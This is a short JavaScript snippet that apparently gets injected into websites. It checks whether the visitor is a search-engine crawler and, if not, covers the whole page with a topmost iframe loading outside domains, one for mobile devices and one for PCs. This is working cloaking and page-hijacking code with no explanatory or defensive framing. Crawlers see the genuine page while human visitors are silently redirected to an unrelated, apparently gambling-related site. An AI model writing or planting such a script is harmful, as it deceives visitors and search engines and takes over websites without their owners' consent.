var reg = /(Baiduspider|360Spider|YisouSpider|YandexBot|Sogou inst spider|Sogou web spider|spider)/i;
if (!reg.test(navigator.userAgent)) {
let flag = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i);
if (flag) {
//k
_src = 'https://bob.ry-toys.com/'
} else {
// PC
_src = 'https://www.270top.com/divbeo/'
}
document.write('<meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1">');
var hd = document.head;
var styleCSS = document.createElement('style'), yabo = document.createElement('div');
styleCSS.innerHTML = 'html,body{position:relative;width:auto !important;height:100% !important;min-width:auto !important;overflow:hidden;}.yabo{position:fixed;top:0;left:0;right:0;height:100%;z-index:9999999999;background:#fff;}';
yabo.setAttribute('class', 'yabo');
yabo.innerHTML = '<iframe src='+ _src +' frameborder="0" style="position:fixed;top:0;left:0;width:100% !important;height:100% !important;max-height: none !important;"></iframe>';
hd.appendChild(styleCSS);
hd.parentNode.appendChild(yabo);
}
